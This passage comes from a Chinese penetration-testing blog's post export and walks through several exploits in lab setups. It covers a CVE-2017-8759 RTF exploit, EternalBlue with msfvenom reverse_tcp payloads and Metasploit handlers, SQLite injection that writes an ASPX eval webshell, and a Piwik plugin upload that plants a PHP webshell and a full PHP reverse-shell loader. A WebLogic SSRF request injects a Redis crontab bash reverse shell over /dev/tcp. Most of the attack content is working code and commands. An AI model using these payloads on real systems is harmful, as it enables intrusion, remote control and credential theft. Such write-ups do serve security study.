然后就是打开该word文档，就可以看到计算器弹出。但实现的过程有点问题，就是必须点更新链接才会触发（即使将添加objupdate还是不行）。 方法二参考https://github.com/vysec/CVE-2017-8759新建o.png，内容为： word.db内容： 新建一个rtf文档，随意插入一个对象。例如http://192.168.135.135/office/o.png (这是为了下面替换objdata内容)用记事本打开，将\\object\\objautlink\\rsltpict修改为\\object\\objautlink\\objupdate\\rsltpict打开blob.bin文件 将其中的地址修改为http://192.168.135.135/office/o.png复制原来的地址，尽量多复制点空格。 然后生成新的hex地址 然后用生成的地址替换blob.bin中的地址然后将blob.bin中的内容替换word文档的objdata内容。然后打开word文档，就会有神奇的事情发生。 恶意软件将被放置在C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\OfficeUpdte-KB[6个随机数字].exe 以上均在虚拟机上测试。没有使用样本中的left.jpg。最后结果确实如火眼所说的那样生成了OfficeUpdte-KB******.exe文件。在win10(真机)上测试的时候还生成了http1001924168413541350office0office4png.pdb、http1001924168413541350office0office4png.dll和Logo.cs三个文件。这里方法一没有直接执行的原因我也不太清楚，但是用方法二插入office.png，也是不会直接执行的。如果方法一和二中过程替换一下，效果也是一样的。 方法三下载脚本https://github.com/fupinglee/MyPython/blob/master/exploit/CVE-2017-8759/CVE-2017-8759_exploit_rtf.py 使用方法：python CVE-2017-8759_exploit_rtf.py http://192.168.135.135/office/office.png会在当前目录生成文件cve-2017-8759.rtf，打开即可。 根据CVE-2017-0199的脚本改写而来，仅仅保留并修改了生成文件的代码。 参考链接[1].https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html[2].http://mp.weixin.qq.com/s/_rfRtj6da1nowI4qMmkLaA[3].https://www.mdsec.co.uk/2017/09/exploiting-cve-2017-8759-soap-wsdl-parser-code-injection/","tags":"cve-2017-8759 .net-framework"},{"title":"使用PentestBox工具利用ETERNALBLUE对Win7进行攻击，获取Meterpreter反弹","url":"/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/","text":"前言MS17-010已经过去很久了，利用PentestBox的方式也提到过，但都是基于python2.6那种方式实现的。本文将使用Sleepya 的脚本利用ETERNALBLUE来实现对Win7进行攻击，从而获取Meterpreter反弹。 靶机为Windows 7，IP为192.168.131.133。攻击机为Win10系统，安装了PentestBox，IP为192.168.217.1。脚本下载地址：https://github.com/worawit/MS17-010 漏洞利用测试1.安装NASM下载地址：http://www.nasm.us/pub/nasm/releasebuilds/ ，我这里用的是2.13。然后开始安装。 安装完成后加入环境变量。 2.下载利用脚本，并编译内核shellcode1git clone https://github.com/worawit/MS17-010 编译内核shellcode 123cd MS17-010/shellcode/nasm -f bin eternalblue_kshellcode_x64.asmnasm -f bin eternalblue_kshellcode_x86.asm 3.生成反弹exp12msfvenom -p windows/meterpreter/reverse_tcp EXITFUNC=thread LHOST=192.168.217.1 LPORT=4445 -f raw -o ../../Git/MS17-010/shellcode/sc_x86_msf.binmsfvenom -p windows/x64/meterpreter/reverse_tcp EXITFUNC=thread LHOST=192.168.217.1 LPORT=4444 -f raw -o ../../Git/MS17-010/shellcode/sc_x64_msf.bin 4.合并SHELLCODE123cat eternalblue_kshellcode_x64 sc_x64_msf.bin &gt; sc_x64.bincat eternalblue_kshellcode_x86 sc_x86_msf.bin &gt; sc_x86.binpython eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin 5.开启Metasploit并监听1234567891011msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set ExitOnSession falsemsf exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcpmsf exploit(handler) &gt; set EXITFUNC threadmsf exploit(handler) &gt; set LHOST 192.168.217.1msf exploit(handler) &gt; set LPORT 4444msf exploit(handler) &gt; exploit -j...msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set LPORT 4445msf exploit(handler) &gt; exploit -j 6.进行攻击1python eternalblue_exploit7.py 192.168.131.133 shellcode\\sc_all.bin 看到已经获取Meterpreter反弹。 遇到的问题在PentestBox中运行一些命令时(如msfconsole)，提示不是内部或外部命令，也不是可运行的程序或批处理文件。解决方法：输入cmd之后再输入需要执行的命令。 总结1.这种方式利用稍微简单点，不需要过多的命令，而且生成的SHELLCODE也具有复用性。2.在以上的操作中，均生成了32位和64位的shellcode，最后利用eternalblue_sc_merge脚本合并到一起。然后在Eternalblue漏洞中利用合并的shellcode可以支持x86和x64，无需再检测目标体系结构。3.在使用中设置了线程，可以同时对多个系统进行攻击测试。例如： 1234python eternalblue_exploit7.py 192.168.131.133 shellcode\\sc_all.binpython eternalblue_exploit7.py 192.168.131.134 shellcode\\sc_all.binpython eternalblue_exploit7.py 192.168.131.135 shellcode\\sc_all.binpython eternalblue_exploit7.py 192.168.131.136 shellcode\\sc_all.bin 攻击结果： 参考[1]https://github.com/worawit/MS17-010[2]https://www.exploit-db.com/docs/42280.pdf","tags":"ms17-010 pentestbox metasploit"},{"title":"SQLite手工注入Getshell技巧","url":"/2017/07/19/SQLite-Injection-Get-WebShell/","text":"0x01 前言SQLite是一种嵌入式数据库，它的数据库就是一个文件。由于SQLite本身是C写的，而且体积很小，所以经常被集成到各种应用程序中，主要在手机的App中使用。之前没有遇到过关于SQLite的注入，这次遇到一个在ASPX中使用SQLite数据库，并且存在注入。这篇文章将主要介绍一下从注入到获取WEBSHELL的过程和遇到的一些坑。首先介绍一下SQLite的使用方法，然后在本地搭建环境以及利用注入获取WEBSHELL，最后将讲述在实际应用中遇到的问题以及如何解决（e.g.手工注入写shell）。 0x02 SQLite的使用SQLite 的一个重要的特性是零配置的，这意味着不需要复杂的安装或管理。在 Windows 上使用SQLite时访问 SQLite下载页面，从 Windows 区下载预编译的二进制文件。现在最新的为sqlite-tools-win32-x86-3190300.zip，下载下来后解压。我这里将其中的文件复制到D:\\sqlite目录。 SQLite的语法和其他数据库差不多，只不过SQLite的数据库是一个单独的文件。SQLite创建数据库的方法有两种，一种是创建，另外一种是附加。 创建使用命令：sqlite3.exe 数据库文件名。例如创建一个名字为aa.db的数据库，使用命令：sqlite3.exe aa.db。 附加数据库的基本语法是：ATTACH DATABASE &#39;DatabaseName&#39; As &#39;Alias-Name&#39;;。如果数据库尚未被创建，这个命令将创建一个数据库，如果数据库已存在，则把数据库文件名称与逻辑数据库 ‘Alias-Name’ 绑定在一起。例如附加一个bb.db的数据库，别名为a，命令为：attach database &#39;d:\\\\sqlite\\\\bb.db&#39; as &#39;a&#39;;。 创建表并插入数据的命令如下： 1create table a.tt(dataz text); INSERT into a.tt(dataz) VALUES ('test'); SQLite还可以生成任意后缀名的数据库文件。例如创建一个php结尾的数据库文件，新建一个名为exp的表，并在其中插入数据，内容为：&lt;?php phpinfo();?&gt;。 具体命令如下： 1sqlite&gt;ATTACH DATABASE 'd:\\\\sqlite\\\\23.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('&lt;?php phpinfo();?&gt;');-- 将生成的数据库文件23.php放在web目录，然后访问。发现数据库中插入的数据竟被解析了。 同样的方法生成aspx后缀的数据库文件，创建表，并插入&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;。然后将该文件放在IIS服务的web目录。发现其中的APSX代码也会被解析。 通过查看生成的数据库文件，发现其中表的内容都以原格式存储的，这就导致了表中的代码被解析的原因。接下来将在本地搭建一个ASPX+SQLite的web项目，演示一下如何通过SQL注入获取WEBSHELL。 0x03 本地环境搭建及获取SHELL因为在实际应用中遇到的是.Net开发的web项目，所以这里也以ASPX程序为例。 1.环境搭建和项目的部署下载安装 Sqlite ADO.NET，下载后直接安装即可。安装后将其中的System.Data.SQLite.DLL文件复制出来，在下面的项目中将会用到（分32和64位，根据自己的环境选择）。 这里我采用VS2013，新建一个ASP.NET网站，在项目中新建一个Bin文件夹和一个ASPX页面（这里名称为Default.aspx)，将上面复制出来的System.Data.SQLite.DLL文件放在Bin目录中。 其目录结构如图： Default.aspx是显示页面，其中有一个文本框和按钮。主要代码： 123456&lt;form id=\"form1\" runat=\"server\"&gt;&lt;div&gt; &lt;asp:TextBox ID=\"TextBox1\" runat=\"server\"&gt;&lt;/asp:TextBox&gt; &lt;asp:Button ID=\"Button1\" runat=\"server\" OnClick=\"btn_Click\" Text=\"查询\" /&gt;&lt;/div&gt;&lt;/form&gt; Default.aspx.cs是代码的实现，代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162using System;using System.Collections.Generic;using System.Linq;using System.Web;using System.Web.UI;using System.Web.UI.WebControls;using System.Data.SQLite; public partial class _Default : System.Web.UI.Page&#123; protected void Page_Load(object sender, EventArgs e) &#123; if (!System.IO.File.Exists(Server.MapPath(\"~\") + \"/UserData.dbx\")) &#123; SQLiteConnection.ClearAllPools(); SQLiteConnection.CreateFile(Server.MapPath(\"~\") + \"/UserData.dbx\"); SQLiteConnection conn = new SQLiteConnection(\"Data Source=\" + Server.MapPath(\"~\" + \"/UserData.dbx\")); conn.Open(); SQLiteCommand cmd = new SQLiteCommand(); cmd.CommandText = \"create table Users (UserID int primary key,UserName varchar(100) not null,UserPassword varchar(100) not null)\"; cmd.Connection = conn; cmd.ExecuteNonQuery(); for (int i = 0; i &lt; 100; i++) &#123; cmd.CommandText = \"insert into Users (UserID,UserName,UserPassword) values (\" + i + \",'TestUser_\" + i + \"','\" + DateTime.Now.ToString().Replace(\" \", \"-\").Replace(\":\", \"-\") + \"')\"; cmd.ExecuteNonQuery(); &#125; conn.Clone(); conn.Dispose(); Response.Write(\"初始化~~&lt;br /&gt;\"); &#125; Response.Write(\"加载成功~~&lt;br /&gt;\"); &#125; protected void btn_Click(object sender, EventArgs e) &#123; if (TextBox1.Text != \"\")&#123; SQLiteConnection.ClearAllPools(); //SQLiteConnection.CreateFile(Server.MapPath(\"~\") + \"/UserData.dbx\"); SQLiteConnection conn = new SQLiteConnection(\"Data Source=\" + Server.MapPath(\"~\" + \"/UserData.dbx\")); conn.Open(); SQLiteCommand cmd = new SQLiteCommand(); cmd.CommandText = \"select UserPassword from Users where UserName='\" + TextBox1.Text.Trim()+\"'\"; cmd.Connection = conn; if (cmd.ExecuteScalar() != null) &#123; string tempUserName = cmd.ExecuteScalar().ToString(); Response.Write(\"查询结果为:\" + tempUserName + \"&lt;br /&gt;&lt;br /&gt;\"); &#125; else &#123; Response.Write(\"无此用户\"); &#125; &#125; else &#123; Response.Write(\"请输入查询内容~~&lt;br /&gt;\"); &#125; &#125;&#125; 然后将项目部署即可，这就是一个存在注入的项目。接下来就是利用注入来获取WEBSHELL。 2.SQL注入写WEBSHELL 当输入&#39;时，项目报错，同时将web绝对路径暴露出来。 然后就根据上面SQLite创建ASPX格式的数据库的方式来写入一个WEBSHELL。 其语句为： 1';ATTACH DATABASE 'c:\\\\WebSite\\\\css.aspx' AS pwn ;create TABLE pwn.exp (dataz text) ; insert INTO pwn.exp (dataz) VALUES ('&lt;%@ Page Language=\"Jscript\"%&gt;&lt;%eval(Request.Item[\"pass\"],\"unsafe\");%&gt;'); -- 测试环境很顺利就通过SQL注入写入了WEBSHELL，但是在实际测试中并非如此顺利。接下来看看在实际应用中遇到的问题以及解决的方法。 0x04 实际中应用中遇到的问题及解决方法已知：该系统存在SQL注入，数据库为SQLite，通过报错发现web项目的绝对路径。后台存在弱口令，后台可以上传图片格式文件。 直接利用SQLite写aspx文件时，发现可以写入成功，但是SHELL没有执行。无法判断是shell代码未写入成功还是未执行成功。然后就先写个TXT查看shell代码是否可以写入成功。 1';ATTACH DATABASE 'd:\\\\********\\\\web\\\\24.txt' AS pwn ;create TABLE pwn.exp (dataz text) ; insert INTO pwn.exp (dataz) VALUES ('&lt;%@ Page Language=\"Jscript\"&gt;&lt;%eval(Request.Item[\"pass\"],\"unsafe\");%&gt;'); -- 然后直接访问根目录下的24.txt文件即可下载，下载后用SQLite数据库管理工具打开，这里用的是Navicat。 打开发现竟然是空的。然而将shell代码替换为字符串test时可以写入成功。那应该就是写入的SHELL中含有一些符号所致，这里尝试了转义都未能解决。 由于可以找到图片上传的入口，所以有这样一个思路：在本地生成一个格式为jpg的数据库文件，创建表并写入SHELL，然后上传到服务器；在网站上利用注入新建一个txt格式的数据库，创建表后将图片格式数据库的内容插入到txt格式数据库中。 提示数据库编码不一致，那就换另外一种方法。首先在web根目录生成一个jpg格式的数据库，创建表后下载；在本地打开后插入数据，之后上传到服务器；再在网站新建一个ASPX格式的数据库，创建表后将图片格式数据库的内容插入到ASPX格式数据库中。 1';ATTACH DATABASE 'd:\\\\********\\\\web\\\\fp.jpg' AS pwn;create TABLE pwn.exp(dataz text);-- 可以成功写入，但访问发现插入的ASPX代码被原样输出，SHELL未执行成功。然后来对比一下在web上生成和本地生成的文件有什么区别。 分别在本地和web上生成一个txt格式的数据库文件，新建表后插入test。然后对比其内容： 对比后发现网站生成的内容都多了一个空格。 有同事提议说用十六进制试试，然后将shell内容转换为十六进制后插入。然而在web上测试失败。 本地测试也失败。 经过搜索发现，SQLite中十六进制的写法为：x&#39;....&#39;，而不是0x....。 例如&lt;%@ Page Language=&quot;Jscript&quot;&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;在SQLite中的十六进制表示为： 1x'3c25402050616765204c616e67756167653d224a736372697074223e3c256576616c28526571756573742e4974656d5b2270617373225d2c22756e7361666522293b253e' 成功写入shell 菜刀连接： 0x05 总结通过以上的测试过程和实际利用，可以归纳两点： 1.SQLite可以创建任意格式的数据库文件，并且插入的代码可以根据文件格式来解析，这就造成了可以利用这种方式写WEBSHELL的原因。2.SQLite中十六进制的写法为：x&#39;....&#39;，而不是0x....。 0x06 参考[1]http://www.cnblogs.com/xiaozi/p/5760321.html[2]https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet[3]http://blog.csdn.net/mazhaojuan/article/details/7660657","tags":"webshell sqlite"},{"title":"Piwik代码执行漏洞安全分析（附验证过程Getshell）","url":"/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/","text":"0x01 概述Piwik是一个PHP和MySQL的开放源代码的Web统计软件. 它给你一些关于你的网站的实用统计报告，比如网页浏览人数, 访问最多的页面, 搜索引擎关键词等等。 Piwik拥有众多不同功能的插件，你可以添加新的功能或是移除你不需要的功能，Piwik同样可以安装在你的服务器上面，数据就保存在你自己的服务器上面。你可以非常容易的插入统计图表到你的博客或是网站抑或是后台的控制面板中。安装完成后，你只需将一小段代码放到将要统计的网页中即可。 在17年2月份FireFart报告了一个Piwik超级用户获取远程代码执行的漏洞。该漏洞通过利用构造插件，然后利用超级用户上传并激活，在激活插件时会执行插件中的PayLoad，从而获取shell。本文将介绍一下漏洞原理、环境的搭建、PayLoad的构造以及漏洞的复现过程，如有不足，请多多指教。 0x02 漏洞原理分析插件激活时请求的URL为：http://192.168.217.1/piwik-3.0.1/index.php?module=CorePluginsAdmin&amp;action=activate&amp;idSite=1&amp;period=day&amp;date=yesterday&amp;nonce=4fe9b3937078e06f3f24d45a53ee614c&amp;pluginName=ff 代码定位到piwik-3.0.1\\plugins\\CorePluginsAdmin\\Controller.php中的activate方法。 找到pluginManager调用的激活插件方法。 123456789public function activate($redirectAfter = true) &#123; $pluginName = $this-&gt;initPluginModification(static::ACTIVATE_NONCE); $this-&gt;dieIfPluginsAdminIsDisabled(); $this-&gt;pluginManager-&gt;activatePlugin($pluginName);//激活插件 .... //省略部分代码 &#125; 然后往上翻，找到pluginManager变量。 12345private $pluginManager;....//省略部分代码$this-&gt;pluginManager = Plugin\\Manager::getInstance();..... 定位到piwik-3.0.1\\core\\Plugin\\Manager.php文件，找到其activatePlugin方法。 1234567891011121314public function activatePlugin($pluginName) &#123; .... //省略部分代码 // Load plugin $plugin = $this-&gt;loadPlugin($pluginName); if ($plugin === null) &#123; throw new \\Exception(\"The plugin '$pluginName' was found in the filesystem, but could not be loaded.'\"); &#125; $this-&gt;installPluginIfNecessary($plugin); $plugin-&gt;activate(); .... //省略部分代码 &#125; loadPlugin是根据插件名字加载，最后生成一个类对象，可以直接调用其中的方法，其代码如下： 12345678910public function loadPlugin($pluginName)&#123; if (isset($this-&gt;loadedPlugins[$pluginName])) &#123; return $this-&gt;loadedPlugins[$pluginName]; &#125; $newPlugin = $this-&gt;makePluginClass($pluginName); $this-&gt;addLoadedPlugin($pluginName, $newPlugin); return $newPlugin;&#125; installPluginIfNecessary方法是判断该插件是否安装，如果没有安装的话，调用executePluginInstall方法来安装，executePluginInstall方法执行了插件中的install()方法，然后再执行activate()方法。 由此可知，当激活插件时，会加载插件，将其生成为类对象。然后判断是否安装插件，如果没有安装，调用插件中的install()方法，再调用activate()方法。接下来就开始搭建环境具体来实现一下。 0x03 环境的搭建1.准备工作主机：Windows10 x64 WEB环境：采用的是phpStudy集成环境（PHP/5.5.30，MySQL/5.5.47，Apache/2.4.18 ） 程序版本：3.0.1(也可以在https://builds.piwik.org/ 下载) 2.composer工具的安装下载地址：https://getcomposer.org/Composer-Setup.exe 下载后直接运行Composer-Setup.exe进行安装。 然后根据提示，继续下一步即可。 注意：安装时PHP应开启php_openssl扩展，不然会报错。 3.Piwik程序的部署将下载下来的程序源码解压到phpStudy下的WWW目录。这里我项目名字为piwik-3.0.1。 在piwik-3.0.1目录下执行composer install命令来安装项目所依赖的代码库。 安装后在项目的根目录会出现一个vendor文件夹。 访问http://192.168.217.1/piwik-3.0.1/ 开始进行安装 点击Next进行下一步安装。 数据库设置 超级用户设置 之后进行系统的设置，这里就省略过程了。 安装完成后访问http://192.168.217.1/piwik-3.0.1/ 进行登陆。 用户名/密码为第五步中设置的超级用户。 0x04 验证过程1.漏洞产生原因及PayLoad的编写Piwik默认在3.0.3之前允许自定义插件上传，当插件被激活时，install方法会被调用，会执行其中编写的PayLoad。 如果我们编写一个名字叫做pwned的插件，其文件结构为： 123pwned/pwned/pwned.phppwned/plugin.json 文件内容： pwned.php 12345678&lt;?phpnamespace Piwik\\Plugins\\pwned;class pwned extends \\Piwik\\Plugin &#123; public function install() &#123; //要执行的Payload &#125;&#125; plugin.json 123456&#123; \"name\": \"pwned\",//插件名称 \"description\": \"DESCRIPTION\",//插件描述 \"version\": \"1.0\",//插件版本 \"theme\": false&#125; 然后将其压缩为zip格式的压缩文件。当插件上传后并被激活时，就会执行pwned.php中的payload。 2.漏洞利用PayLoad的准备 修改上述的pwned.php代码，在install方法中添加写shell的代码。 12345678910&lt;?phpnamespace Piwik\\Plugins\\pwned;class pwned extends \\Piwik\\Plugin &#123; public function install() &#123; $myfile = fopen(\"shell.php\", \"w\") or die(\"Unable to open file!\"); $content = \"&lt;?eval(\\$_POST['pass']);?&gt;\"; fwrite($myfile, $content); &#125;&#125; plugin.json不用做过多的修改。 然后压缩为pwned.zip。 PayLoad的利用 利用创建的超级用户登陆，登陆后点击Administration或者访问http://192.168.217.1/piwik-3.0.1/index.php?module=CoreAdminHome&amp;action=home&amp;idSite=1&amp;period=day&amp;date=yesterday 安装新插件 上传新插件 插件上传 插件上传成功 然后点击激活插件按钮 插件激活后，会在根目录生成一个shell.php 3.利用Metasploit生成meterpreter会话上面的结果是写入了WEBSHELL，也可以采用piwik_superuser_plugin_upload直接生成一个meterpreter会话。 1234567891011msf &gt; use exploit/unix/webapp/piwik_superuser_plugin_upload msf exploit(piwik_superuser_plugin_upload) &gt; msf exploit(piwik_superuser_plugin_upload) &gt; set PASSWORD admin888PASSWORD =&gt; admin888msf exploit(piwik_superuser_plugin_upload) &gt; set RHOST 192.168.217.1RHOST =&gt; 192.168.217.1msf exploit(piwik_superuser_plugin_upload) &gt; set TARGETURI /piwik-3.0.1/TARGETURI =&gt; /piwik-3.0.1/msf exploit(piwik_superuser_plugin_upload) &gt; set USERNAME adminUSERNAME =&gt; adminmsf exploit(piwik_superuser_plugin_upload) &gt; exploit 利用Metasploit时有时候会不成功，或者是第一次成功之后无法再次复现。但是利用上传webshell可以成功。 0x05 总结之前在3月份曾经遇到过类似的站点，然后本地搭建环境测试的时候，只顾着用Metasploit进测试，并没有出结果，就没继续下去了。最近又重新看了一下原理，然后实现并记录一下过程。 这里仅仅用3.0.1举例，根据firefart说的影响版本2.14.0/2.16.0/2.17.1/3.0.1，其他并未测试。 Q:直接上传包含shell的压缩包可以吗？ A:可以上传成功，但在plugins目录下无法执行php代码。 Q:Payload中除了install()方法还可以写其他方法吗？ A:可以的。例如还有uninstall/deactivate/activate等方法，分别在卸载插件/关闭插件/激活插件的时候调用。例如如下的代码： 123456789101112131415161718192021222324252627282930&lt;?phpnamespace Piwik\\Plugins\\ff;class ff extends \\Piwik\\Plugin &#123; public function install()//安装插件，执行一次 &#123; $myfile = fopen(\"install.txt\", \"w\") or die(\"Unable to open file!\"); $content = \"install ...\"; fwrite($myfile, $content); &#125; public function uninstall()//卸载插件，执行一次 &#123; $myfile = fopen(\"uninstall.txt\", \"w\") or die(\"Unable to open file!\"); $content = \"uninstall ...\"; fwrite($myfile, $content); &#125; public function deactivate()//关闭插件，可以多次执行 &#123; $myfile = fopen(\"deactivate.txt\", \"w\") or die(\"Unable to open file!\"); $content = \"deactivate ...\"; fwrite($myfile, $content); &#125; public function activate()//激活插件，可以多次执行 &#123; $myfile = fopen(\"activate.txt\", \"w\") or die(\"Unable to open file!\"); $content = \"activate ...\"; fwrite($myfile, $content); &#125;&#125; Q:可以上传WEBSHELL，但是利用Metasploit无法生成meterpreter会话，还想反弹shell怎么办？ A:可以利用手动上传插件的方法，将其中的Payload修改为反弹shell的代码。 具体可以这样操作： 首先看看Metasploit利用的Payload是什么。 可以在generate_plugin方法中添加打印payload.encoded的语句，例如使用print_status(&quot;data:#{payload.encoded}&quot;)将其内容打印出来 然后使用reload_all重新加载脚本，并使用piwik_superuser_plugin_upload脚本，将会打印出来payload的内容 或者可以利用msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.131.128 LPORT=4444 -f raw &gt;c.php来生成payload，内容一样 然后将生成的内容放在插件PHP代码中。整理格式后如下： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpnamespace Piwik\\Plugins\\pwned;class pwned extends \\Piwik\\Plugin &#123; public function install() &#123; error_reporting(0); $ip = '192.168.131.128'; $port = 4444; if (($f = 'stream_socket_client') &amp;&amp; is_callable($f)) &#123; $s = $f(\"tcp://&#123;$ip&#125;:&#123;$port&#125;\"); $s_type = 'stream'; &#125; elseif (($f = 'fsockopen') &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = 'stream'; &#125; elseif (($f = 'socket_create') &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) &#123; die(); &#125; $s_type = 'socket'; &#125; else &#123; die('no socket funcs'); &#125; if (!$s) &#123; die('no socket'); &#125; switch ($s_type) &#123; case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; &#125; if (!$len) &#123; die(); &#125; $a = unpack(\"Nlen\", $len); $len = $a['len']; $b = ''; while (strlen($b) &lt; $len) &#123; switch ($s_type) &#123; case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; &#125; &#125; $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); die(); &#125;&#125; 然后就是利用上传插件来上传插件并激活了。 正确姿势： 请注意要加set PAYLOAD php/meterpreter/reverse_tcp，不然会报各种错误。 下面的为其中的错误。 0x06 参考[1]https://firefart.at/post/turning_piwik_superuser_creds_into_rce/[2]https://github.com/rapid7/metasploit-framework/pull/7917","tags":"metasploit piwik 漏洞分析"},{"title":"Weblogic 常见漏洞环境的搭建及其利用","url":"/2017/06/05/Weblogic-Vulnerability-Verification/","text":"0x00 WebLogic 介绍及常见漏洞WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。WebLogic常用端口7001/7002，常见漏洞有弱口令导致上传任意war包、SSRF漏洞和反序列化漏洞。本文将利用phith0n提供的漏洞利用环境进行验证(在此向P牛致敬，感谢无私奉献)，Weblogic的环境地址https://github.com/phith0n/vulhub/tree/master/weblogic。 0x01 WebLogic 弱口令导致上传并部署war包获取WEBSHELL通过WebLogic弱口令登录后，上传war包，来获取WEBSHELL。下载项目后进入到/weblogic/weak_password目录，运行命令sudo docker-compose build进行编译（请参照https://github.com/phith0n/vulhub/blob/master/README.md 进行docker的安装）。编译完成后进行启动使用如下命令： 12fuping@ubuntu:~/Git/vulhub/weblogic/weak_password$ sudo docker-compose up -d #启动fuping@ubuntu:~/Git/vulhub/weblogic/weak_password$ sudo docker ps #查看启动的docker Ubuntu的ip为192.168.232.137，WebLogic的访问地址为：http://192.168.232.137:7001 访问 http://192.168.232.137:7001/console 会跳转到管理员登录页面http://192.168.232.137:7001/console/login/LoginForm.jsp 这里用户名密码分别为：weblogic/Oracle@123上传war过程如下图所示 总结起来就是：域结构-部署-安装-上传文件-将此部署安装为应用程序。然后访问项目名称即可。 如果不存在弱口令，可以根据其他漏洞获取SerializedSystemIni.dat和config.xml，然后解密即可。具体案例可以参考https://github.com/phith0n/vulhub/blob/master/weblogic/weak_password/README.md ，这里采用了任意文件读取漏洞，获取了SerializedSystemIni.dat和config.xml文件内容，然后解密。 WebLogic加密解密方式 WebLogic 11gR1后采用了AES的加密方式，默认的管理密码文件存放于：安装目录/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties 例如靶机中的密码文件位于：/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties 内容为： 12username=&#123;AES&#125;xdwPe62ds+jcPCQwwLn/VR3fI0e9ZGkFz96ZBqmvRpY=password=&#123;AES&#125;dv/eNBsyg5GcDUbAKaQRheDZhzVk9yiTYVpXlGt9wEU= 加密key保存在SerializedSystemIni.dat文件中。默认位置：安装目录/user_projects/domains/base_domain/security/SerializedSystemIni.dat 靶机中的位于：/root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat 采用这两个文件就可以进行解密了。 WebLogic 11gR1之前的版本采用的DES加密方式。安装目录/samples/domains/wl_server/security/boot.properties内容格式： 12username=&#123;3DES&#125;fy709SQ4pCHAFk+lIxiWfw==password=&#123;3DES&#125;fy709SQ4pCHAFk+lIxiWfw== 采用上面的解密工具即可解密。 0x02 WebLogic SSRF漏洞漏洞编号：CVE-2014-4210漏洞影响： 版本10.0.2,10.3.6 Oracle WebLogic Web Server既可以被外部主机访问，同时也允许访问内部主机。比如有一个jsp页面SearchPublicReqistries.jsp，我们可以利用它进行攻击，未经授权通过weblogic server连接任意主机的任意TCP 端口，可以能冗长的响应来推断在此端口上是否有服务在监听此端口。进入到/weblogic/ssrf目录，运行命令sudo docker-compose build进行编译。 编译时将Dockerfile文件中的第六行&amp;&amp; yum update \\修改为&amp;&amp; yum update -y \\，不然会出现错误ERROR: Service &#39;redis&#39; failed to build: The command &#39;/bin/sh -c set -ex &amp;&amp; yum update &amp;&amp; yum install -y gcc-c++ tcl wget&#39; returned a non-zero code: 1。并且无法编译。（感谢P牛的解答） 编译完成后进行启动使用如下命令： 12fuping@ubuntu:~/Git/vulhub/weblogic/ssrf$ sudo docker-compose up -d #启动fuping@ubuntu:~/Git/vulhub/weblogic/ssrf$ sudo docker ps #查看启动的docker ![启动WebLogic SSRF环境](启动WebLogic SSRF环境.png) 利用脚本扫描内网开放端口的主机。 根据https://github.com/phith0n/vulhub/blob/master/weblogic/ssrf/README.md 利用Redis反弹shell在Ubuntu上执行命令nc -l -p 1234发送请求包 123456789GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.232.137%2F1234%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search HTTP/1.1Host: 192.168.232.137:7001User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; ADMINCONSOLESESSION=6L9hZ1GCsBrQWk49rcJ5K1zxygCPpysB4FrD8xk27XV50KzBh2rT!657144266; JSESSIONID=Q92gZ1fYpmLHP5yCxg4TpdjKCTTHhKTTZS1XKXTNDNf40R80H5J0!-1544297006Connection: closeUpgrade-Insecure-Requests: 1 过一会查看Ubuntu可以看到一个shell 修复建议： 1.如果业务不需要UDDI功能，就关闭这个功能。可以删除uddiexporer文件夹，可以可在/weblogicPath/server/lib/uddiexplorer.war解压后，注释掉上面的jsp再打包。 2.安装oracle的更新包。 0x03 WebLogic 反序列化漏洞漏洞编号：CVE-2015-4852漏洞影响： Oracle 